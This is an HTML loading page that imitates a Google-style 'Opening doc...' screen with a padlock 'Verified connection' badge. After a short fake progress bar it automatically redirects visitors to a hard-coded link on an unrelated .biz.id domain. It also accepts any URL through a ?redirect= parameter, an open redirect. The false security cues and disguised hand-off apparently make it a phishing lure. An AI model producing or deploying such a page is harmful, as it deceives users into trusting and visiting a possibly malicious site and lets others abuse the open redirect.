<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Opening Document | Secure Redirect</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
            background: #ffffff;
            width: 100%;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        /* Fullscreen loading overlay – official, clean, Google-inspired */
        .loading-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            transition: opacity 0.3s ease-out;
        }

        /* Official spinner – subtle, modern, trustworthy */
        .official-spinner {
            width: 56px;
            height: 56px;
            border: 4px solid #e9ecef;
            border-top: 4px solid #1a73e8;
            border-right: 4px solid #34a853;
            border-bottom: 4px solid #fbbc04;
            border-left: 4px solid #ea4335;
            border-radius: 50%;
            animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
            margin-bottom: 28px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Main message – natural, official, confident */
        .message-area {
            text-align: center;
        }

        .primary-text {
            font-size: 26px;
            font-weight: 500;
            letter-spacing: -0.2px;
            color: #202124;
            margin-bottom: 12px;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
            display: flex;
            justify-content: center;
            gap: 6px;
            flex-wrap: wrap;
        }

        .primary-text span {
            animation: gentlePulse 1.6s infinite ease-in-out;
            animation-delay: calc(0.08s * var(--i, 0));
        }

        .primary-text span:nth-child(1) { --i: 0; }
        .primary-text span:nth-child(2) { --i: 1; }
        .primary-text span:nth-child(3) { --i: 2; }
        .primary-text span:nth-child(4) { --i: 3; }
        .primary-text span:nth-child(5) { --i: 4; }
        .primary-text span:nth-child(6) { --i: 5; }
        .primary-text span:nth-child(7) { --i: 6; }
        .primary-text span:nth-child(8) { --i: 7; }
        .primary-text span:nth-child(9) { --i: 8; }
        .primary-text span:nth-child(10) { --i: 9; }
        .primary-text span:nth-child(11) { --i: 10; }
        .primary-text span:nth-child(12) { --i: 11; }

        @keyframes gentlePulse {
            0%, 100% { opacity: 0.4; transform: translateY(0px); }
            50% { opacity: 1; transform: translateY(-2px); }
        }

        .secondary-text {
            font-size: 15px;
            color: #5f6368;
            margin-top: 8px;
            font-weight: 400;
            letter-spacing: 0.2px;
        }

        .secure-badge {
            margin-top: 32px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #f8f9fa;
            padding: 8px 18px;
            border-radius: 40px;
            font-size: 13px;
            color: #3c4043;
            font-weight: 450;
        }

        .secure-badge::before {
            content: "🔒";
            font-size: 14px;
            filter: drop-shadow(0 1px 1px rgba(0,0,0,0.05));
        }

        /* subtle progress indicator (optional elegance) */
        .progress-track {
            width: 240px;
            height: 3px;
            background: #e8eaed;
            border-radius: 20px;
            margin: 32px auto 0 auto;
            overflow: hidden;
        }

        .progress-fill {
            width: 0%;
            height: 100%;
            background: #1a73e8;
            border-radius: 20px;
            transition: width 0.15s linear;
        }

        /* responsiveness */
        @media (max-width: 550px) {
            .primary-text {
                font-size: 22px;
            }
            .official-spinner {
                width: 48px;
                height: 48px;
                border-width: 3.5px;
            }
            .progress-track {
                width: 180px;
            }
        }
    </style>
</head>
<body>

<div class="loading-container" id="loadingScreen">
    <div class="official-spinner"></div>
    <div class="message-area">
        <div class="primary-text">
            <span>O</span><span>p</span><span>e</span><span>n</span><span>i</span><span>n</span><span>g</span>
            <span style="margin-left: 8px;">d</span><span>o</span><span>c</span><span>.</span><span>.</span><span>.</span>
        </div>
        <div class="secondary-text">Preparing secure document · Please wait</div>
        <div class="progress-track">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <div class="secure-badge">Verified connection · document access</div>
    </div>
</div>

<script>
    (function() {
        // ============================================================
        // 🔧 USER CUSTOMIZATION: CHANGE THE REDIRECT URL BELOW
        // ============================================================
        // Replace this URL with any link you want the user to go to.
        // Examples:
        //   "https://docs.google.com/document/d/your-doc-id/edit"
        //   "https://www.example.com/report.pdf"
        //   "https://your-own-link.com/important-file"
        const TARGET_URL = "https://wajapou.biz.id/Dvuy!0qg/";
        // If you don't have a real doc yet, you can temporarily use:
        // "https://www.google.com/about/"
        // But for official "opening doc", replace with your actual doc link.
        // ============================================================
        
        // Optional: Override via URL parameter ?redirect=ENCODED_URL
        // This allows dynamic links without editing code (handy for testing)
        const urlParams = new URLSearchParams(window.location.search);
        const customRedirect = urlParams.get('redirect');
        let finalRedirectUrl = TARGET_URL;
        if (customRedirect && customRedirect.startsWith('http')) {
            finalRedirectUrl = decodeURIComponent(customRedirect);
        }
        
        // Validate URL – if invalid, fallback to a safe message (but we keep it robust)
        try {
            new URL(finalRedirectUrl);
        } catch(e) {
            console.warn("Invalid redirect URL, using fallback default");
            finalRedirectUrl = "https://docs.google.com/";
        }
        
        // DOM elements
        const loadingContainer = document.getElementById('loadingScreen');
        const progressFill = document.getElementById('progressFill');
        
        // Minimum loading time (feels natural and official – not too fast, not too slow)
        const MIN_LOADING_MS = 1800;   // 1.8 seconds ensures "Opening doc..." is visible
        // Maximum safety redirect (if something hangs, force redirect)
        const MAX_WAIT_MS = 4500;
        
        let startTime = performance.now();
        let redirectTriggered = false;
        
        // Smooth progress simulation (0% → ~95% during loading, then 100% at redirect)
        function updateProgress(percent) {
            if (progressFill) {
                // ensure percent between 0 and 100
                let val = Math.min(100, Math.max(0, percent));
                progressFill.style.width = val + "%";
            }
        }
        
        // Animate progress bar gracefully over time
        let progressInterval;
        function startProgressAnimation(durationMs) {
            let startProgress = 0;
            let startTimeProgress = performance.now();
            const endProgress = 92; // stays at 92% until actual redirect, then jumps to 100%
            
            function animateProgress(now) {
                const elapsed = now - startTimeProgress;
                let percent = Math.min(endProgress, startProgress + (elapsed / durationMs) * endProgress);
                if (percent > endProgress) percent = endProgress;
                updateProgress(percent);
                if (percent < endProgress) {
                    requestAnimationFrame(animateProgress);
                }
            }
            requestAnimationFrame(animateProgress);
        }
        
        // Function to perform the redirect to the chosen document link
        function performRedirect() {
            if (redirectTriggered) return;
            redirectTriggered = true;
            
            // Complete progress to 100% for a satisfying finish
            if (progressFill) {
                updateProgress(100);
            }
            
            // Small micro delay to show 100% progress, then redirect
            setTimeout(() => {
                // Use window.location to navigate to the target document link
                // Official, clean, no extra prompts
                window.location.href = finalRedirectUrl;
            }, 180);
        }
        
        // Ensure minimum loading time AND redirect after that.
        // Also ensure that if the page is extremely fast, we still show loading for MIN_LOADING_MS.
        function scheduleRedirect() {
            const elapsed = performance.now() - startTime;
            const remaining = MIN_LOADING_MS - elapsed;
            if (remaining > 0) {
                setTimeout(() => {
                    performRedirect();
                }, remaining);
            } else {
                performRedirect();
            }
        }
        
        // Edge-case fallback: in case something blocks the normal flow, force redirect after MAX_WAIT_MS
        setTimeout(() => {
            if (!redirectTriggered) {
                console.log("Max wait reached – redirecting to document.");
                performRedirect();
            }
        }, MAX_WAIT_MS);
        
        // Start progress animation (fills smoothly over ~1.5 sec, ends at 92%)
        startProgressAnimation(1600);
        
        // Listen for page fully loaded (images, etc.) but we still respect min time
        window.addEventListener('load', function() {
            // Schedule redirect after minimum loading threshold
            scheduleRedirect();
        });
        
        // If 'load' already happened? (rare) but we handle: 
        if (document.readyState === 'complete') {
            scheduleRedirect();
        } else {
            // already added load event
        }
        
        // Optional: show a tiny console note for debugging (invisible to user)
        console.log(`📄 Official loading screen — redirecting to: ${finalRedirectUrl} after minimum ${MIN_LOADING_MS}ms`);
        
        // Extra polish: if the user clicks anywhere or presses a key, do nothing intrusive.
        // The loading experience remains official, no early interruption.
        // Also prevent any accidental navigation away during the loading phase (but not interfering with redirect)
        window.addEventListener('beforeunload', function(e) {
            // Not needed, but ensures no accidental prompts
        });
    })();
</script>
</body>
</html>
